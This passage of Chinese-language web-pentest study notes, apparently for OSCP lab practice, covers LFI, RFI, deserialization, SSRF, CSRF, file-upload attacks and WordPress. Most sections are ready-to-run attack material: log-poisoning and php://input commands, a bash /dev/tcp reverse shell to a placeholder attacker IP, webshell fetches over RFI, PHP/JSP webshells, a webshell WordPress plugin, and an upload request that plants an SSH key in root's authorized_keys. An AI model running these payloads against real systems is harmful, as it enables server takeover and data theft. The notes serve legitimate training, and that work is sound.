  The admin page is currently under maintenance.
  kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
  ...
  PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
  dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
  ...
  kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
  ...
  <?php
  $servername = "localhost";
  $username = "root";
  $password = "M00nK4keCard!2#";

  // Create connection
  $conn = new mysqli($servername, $username, $password);
  ...
  ```

  </details>

### 利用 LFI 拿 Reverse Shell

<details markdown="1"><summary><span class="spoiler">RCE 方法</span></summary>

- PHP filter + base64（確認能讀檔）

  ```bash
  # 先在 User-Agent 注入 PHP：
  $ curl "http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=index"

  # 然後包含 access log：
  $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log" # linux 限定
  $ curl "http://mountaindesserts.local/meteor/index.php?page=C:/xampp/apache/logs/access.log" # windows 限定
  ```

- Log poisoning（較常見於 OSCP）

  ```bash
  $ curl -A "<?php system(\$_GET['cmd']); ?>" http://mountaindesserts.local/meteor/index.php

  # 然後包含 access log：
  $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=whoami"
  ```

- php://input 或 data:// wrapper
  ```bash
  $ curl -X POST "http://mountaindesserts.local/meteor/index.php?page=php://input" -d "<?php system('id'); ?>"
  ```

</details>

確認 RCE 後，送 Reverse Shell

```bash
$ nc -lvnp 4444
```

透過 RCE 拿 Reverse Shell

```bash
bash -c 'bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1'
↓
$ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<攻擊者IP>%2F4444%200%3E%261%22"
```

### RFI

和 LFI 的差別就是， RFI 弱點是可以讀到**外部**的 file，所以我們可以嘗試在 local 端建一個 http server，讓 victim server 連自己的 http server 拿到 webshell 並且實際執行指令

```bash
$ cd /usr/share/webshells/php/ # 先定位在有 webshell 的地方，確保目錄底下有想要上傳的 webshell
$ python3 -m http.server 80 # 建立一個 http server
```

已知 victim server 有 RFI 弱點，就可以讓他連自己的 IP 拿 webshell

```bash
$ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>/simple-backdoor.php&cmd=ls"
```

## Deserialization

<details markdown="1">
<summary><span class="spoiler">暫時隱藏</span></summary>

要能夠達成 insecure 的反序列化，最重要的兩個前提是

- 反序列化的資料可控
- 針對各個語言反序列化時或之後會觸發哪些 magic method

- 可以搭配 command injection
- php 可以搭配`phar`
- POP Chain: 幾乎每個語言都會有類似的問題存在，最常出現在 PHP 反序列化漏洞（PHP Object Injection） 裡。把一堆「本來正常的 class 功能」串起來，變成可以執行惡意行為的一條攻擊鏈。
  - [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc): 可以直接看對應的 PHP 框架有沒有對應的 payload 達到 RCE
  - [ysoserial](https://github.com/frohoff/ysoserial): 紀錄 JAVA 版本的 POP chain gadgets
  - [ysoserial.net](https://github.com/pwntester/ysoserial.net)

| 語言   | 序列化         | 反序列化       | Magic Method                             |
| ------ | -------------- | -------------- | ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Python | pickle.dumps() | pickle.loads() | `__reduce`                               |
| PHP    | serialize      |                | unserialize                              | `__destruct()`: Object 被銷毀或 garbage collection 會觸發<br>`__wakeup()`: unserialize 時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成 String 處理時呼叫，`echo $obj;`<br> |
| Java   |                |                | `toString`<br>`readObject`<br>`finalize` |
| .NET   |                |                | ViewState & Session 會存放序列化資料     |

</details>

## Frontend

攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部 server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)

## SSRF

<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>

create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓這個中間 server 因為我的偽造 payload 而同意讓我和更裡面的內網 server 溝通，這樣我就打到 inner server，如果有 preview card 這樣的網站要特別注意有沒有 SSRF 的問題

- 利用 gopher 協議建一個偽造 payload

- 如何預防:
  - 限制可訪問的 URL / IP 範圍(使用 whitelist)
  - 避免解析內部 IP → 防止攻擊者透過 URL 指向內網或 localhost (127.0.0.1) 服務。
  - 使用安全的 HTTP client → 設定 timeout、最大連線數、禁用不必要的協議（FTP、file://、gopher:// 等）。
  - 對特殊情境使用代理 / sandbox

</details>

## CSRF(Cross-Site Request Frogery)

<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>

- [[Day25]- 新手的 Web 系列 CSRF](https://ithelp.ithome.com.tw/articles/10251769)
  > 1. 使用者登入網站
  > 2. 使用者透過身份驗證在本機形成 cookie
  > 3. 使用者點擊含有惡意程式的連結，或是直接連結了第三方網站，並瀏覽了帶有以下 html 程式碼的網頁：`<img src=http://www.***.com/transfer.php?id=5&money=22>`
  > 4. 惡意程式碼利用使用者的身份發請求，即執行 CSRF
  > 5. 使用者的帳號少錢錢勒 QQ
  >
  > ![](https://i.imgur.com/gwCvSqZ.png)
  >
  > 常見的 CSRF 方法
  >
  > - HTML 標籤
  >   - `<img>`標籤屬性
  >     ```html
  >     <img src="惡意連結" />
  >     ```
  >     以 GET 方式請求第三方網站，瀏覽器會帶上使用者的 cookie 發出 GET 請求
  >   - `<script>`標籤屬性
  >     ```javascript
  >     `<script src="惡意連結">`;
  >     ```
  >   - `<iframe>`標籤屬性
  >     ```html
  >     `<iframe src="惡意連結">`</iframe>
  >     ```

也就是他和 XSS 的其中一個目的有點像，那就是偷到使用者的 cookie/session，只是方式不同，一個是利用 javascript 的 injection，一個則是利用釣魚或其他的方式迫使使用者**點開**惡意網站，並且冒用使用者的身份對原本使用者正在使用的網站進行各種 request，如果該網站沒有對 user 進行額外的身份驗證，那們光靠 user cookie/session 就有機會達成轉帳、發文之類的操作

- 如何預防 CSRF
  - CSRF Token: 這是最簡單的方式，既然 attacker 可以透過惡意網站得到 victim 的 cookie，那我就額外在 server side 多一個驗證 token 的步驟，而該 token 無論如何都不會被 attacker 利用惡意網站得知，就可以確保目前的 request 是不是本人，而為什麼 CSRF token 無法被 attacker 得知呢?核心原因在於 Same-Origin Policy (SOP)。這是瀏覽器的安全機制，規定：

    > JavaScript 或網頁只能讀取**同一來源（protocol + domain + port）**的資源，不能跨域讀取其他網站的內容。

    所以，attacker 的惡意網站並不會得知 user 在 a.com 這個網域的 token，應該說原本就是這樣設計的，所以除非 attacker**現場**看到受害者的 browser content，才能得知 CSRF Token

  - SameSite Cookie

    就是設定 cookie

    > Set-Cookie: sessionid=abc123; SameSite=Strict

    SameSite 的效果是跨網站 request 不會帶 cookie，那麼同樣的就算 victim 點開 malicious website，也一樣不會被對方讀取到 cookie

  - 敏感操作使用 POST

    前面的 payload 範例有提到很多都是透過 GET qeury 進行惡意操作，那麼我們只要把敏感操作都利用 POST 的方式處理，就可以大大降低 CSRF 發生的情況

</details>

## Upload

- 如果沒有任何保護: 直接 upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到 RCE
- 改 Extension: 如果有保護但只看 extension : 那就偽造 extension 後夾帶 webshell 達到 RCE (`webshell.png.php`)
- 改 Content-Typebypass: `IMAGETYPE`(加入合法的 File Signature) + bypass file type(修改封包 header)
- 雙重副檔名: `shell.jsp.jpg`（若 server 解析第一個副檔名）或 `shell.jpg.jsp`
- 如果只能插入在 Image 中，通常會插在 IEND 後面，如果 response 的 Content-Type 不是 `image/png` 而是 `text/html` ，他會執行後面的 webshell payload

### 利用 Upload + Directory Traversal 上傳 ssh pub key

- 最大的前提是: web server 是以 root 這種高權限運行，在使用自帶 web server 的程式語言（如 Go、Node.js、Python）中很常見，因為開發者或管理員為了省事，直接用 root 啟動應用來避免權限問題。相比之下，傳統的 web server 如 Apache 或 Nginx 通常以低權限使用者（如 www-data）運行，IIS 則用 Network Service 或 Application Pool Identity。這些帳號無法寫入 /root/ 目錄，所以同樣的攻擊就不會成功

1. 先確認上傳的漏洞，使用 `../` 或是 `%2e%2e/` 或 `....//` 可以成功，代表後端沒有驗證，確認有 path traversal
1. 產自己的 ssh key
   ```bash
   $ ssh-keygen -t rsa
   $ cat ~/.ssh/id_rsa.pub
   ssh-rsa AAAAB3Nza...
   ```
1. 在已知有 upload 功能並且有 path traversal 漏洞的情況下，上傳自己的 ssh rsa public key ，在封包中修改

   <details markdown="1">
   <summary><span class="spoiler">Example</span></summary>

   ```bash
   POST /upload HTTP/1.1
   Host: 192.168.232.16:8000
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate, br
   Content-Type: multipart/form-data; boundary=----geckoformboundary29e1e2328f421e5f75d7ef823f471fd
   Content-Length: 820
   Origin: http://192.168.232.16:8000
   Connection: keep-alive
   Referer: http://192.168.232.16:8000/
   Upgrade-Insecure-Requests: 1
   Priority: u=0, i

   ------geckoformboundary29e1e2328f421e5f75d7ef823f471fd
   Content-Disposition: form-data; name="myFile"; filename="../../../../../root/.ssh/authorized_keys"
   Content-Type: application/octet-stream

   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDINaM83V9eNyN3e+ZQ2de5qNxWNQ9LHR9+Ki9aNRwX7sm9yWR8xg03FdPIo/Cqn47WV8D+EXMAKmaVU2bw9XbdYqLYT7L3iEO8IJ5w8p+iyBDX+HNUHaF5fTfYJ4eqbfXQhdTo3igceXjjGZwBBaAP0QAISmyH016eA0Duwk4Sny26rG+XSObA0QUupgYc+5J/ZHUq83Q9qlw0gh3N3egZxwoYgekjxX6ddLWkwbKIFhBmUqxfoRi0FWxcSwQlkuMpI7hEqBhXFojdFRmp0mcy1qNupQybXoA57S3G/sW4kyCEQS0ELaWVWokPBNS+02sPoXzXgtWKZhKYMGVBJRY21oIs6ANAT89ivBwer8WqwP+9vlVR3O1AIlSs9KZeqP7yjXHm1I0r4qesa6tHWKHozQCFdEGHvO2o+u/farz7d44bIdO6Hk9NHv9XR/7sqmaLNYQl3FdqyNAQRFB5XnIN4ASiLhgXpHKWcmW+QDZvbZi8+mnd4bMuXTKShxhD5m8= kali@kali
   ------geckoformboundary29e1e2328f421e5f75d7ef823f471fd--
   ```

   </details>

1. 只要上傳成功，就可以以 root 身份登入
   ```bash
   $ ssh root@192.168.232.16 -p 2222
   root@704d6605d487:~#
   ```

### JSP

如果是 JSP 系統，有以下幾個 Payload 可以試看看

- 最簡單
  ```java
  $ <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
  ```
- Reverse Shell
  <details markdown="1">
  <summary><span class="spoiler">Reverse Shell</span></summary>

  ```java
  <%@ page import="java.io.*" %>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec(cmd);
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      while ((line = br.readLine()) != null) out.println(line);
  }
  %>
  ```

  </details>

### Webshell

```bash
$ cp /usr/share/webshells/php/simple-backdoor.php . # php
$ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 webshell
```

## 如果是 WordPress 網頁

起手式一定是用 wpscan 去掃 plugin 版本，查 exploit

- 所以流程是：(nmap+ffuf)列舉發現 WordPress → 識別 plugin → searchsploit 找漏洞 → 手動測試或 sqlmap 利用。不需要 wpscan，標準的 web 列舉流程就能走到這一步。
- [WpScan](https://wpscan.com/)專門檢測 WordPress 類型的網頁，有哪些漏洞，前期可以掃描出 WP 版本、安裝的 theme 或是插件有哪些、安全漏洞等等
  ```bash
  # 跑 wpscan 找外掛和使用者
  $ wpscan --url http://alvida-eatery.local -e ap,at,u --plugins-detection aggressive -o ./wpscan --api-token <api_token> # 代表 enum 出 all plugin/all theme/user
  # api_token 可以從 https://wpscan.com/profile/ 申請免費的
  # 會直接列出對應版本有哪些 CVE
  $ cat websrv1/wpscan | grep "\[\!\] Title:" | grep -ivE "XSS|Scripting|CSRF|Disclosure|DoS|Redirect|Bypass"
  $ grep -iE "Title:.*\b(RCE|File Upload|File Read|File Download|Deserialization|LFI|SQLi|Injection|Arbitrary File)\b" ./wpscan
  ```
- 上傳 Webshell-Plugin

  <details markdown="1">
  <summary><span class="spoiler">上傳 Webshell-Plugin</span></summary>

  ```bash
  $ cat > webshell-plugin.php << 'EOF'
  <?php
  /**
  * Plugin Name: Webshell Plugin
  * Version: 1.0
  * Author: Offsec
  * Author URI: https://offsec.com
  * License: GPL2
  */

  if(isset($_GET['cmd'])) {
      system($_GET['cmd']);
  }
  ?>
  EOF
  $ zip webshell-plugin.zip webshell-plugin.php
  ```

  </details>

## Tools

<details markdown="1">
<summary><span class="spoiler">Table</span></summary>

| Fuck                                                                    | Beautifier                                                                                |
| ----------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------------------------------- |
| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/) | 把 JS 的程式變成可讀性很差的東西                                                          | [JSNice](http://www.jsnice.org/) |
| [jjencode](https://utf-8.jp/public/jjencode.html)                       | [JS 反混淆器](https://beautifier.io/): 可以反混淆或解密 JS 的檔案                         |
| [aaencode](https://utf-8.jp/public/aaencode.html)                       | [JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)                                          |
| [Esolang List](https://esolangs.org/wiki/Language_list)                 | [JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)                                 |
|                                                                         | [aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html) |

</details>

- psysh: PHP 的互動式 shell
- pwsh: Kali 內建的 Powershell
- wasm → c: [wabt](https://github.com/WebAssembly/wabt)
  ```bash
  # 安裝Cmake，所有過程一定要用WSL
  $ mkdir build && cd build
  $ cmake ..
  $ cmake --build .
  # 按照說明build完後進到./build
  $ ./wasm2c {wasm file path} -o {output c file path}
  ```
- Webhook
  - [Webhook.site](https://webhook.site/)
  - [Beeceptor](https://beeceptor.com/)
  - [Ngrok](https://ngrok.com/)
- [JWT Decoder/Encoder](https://www.jwt.io/)
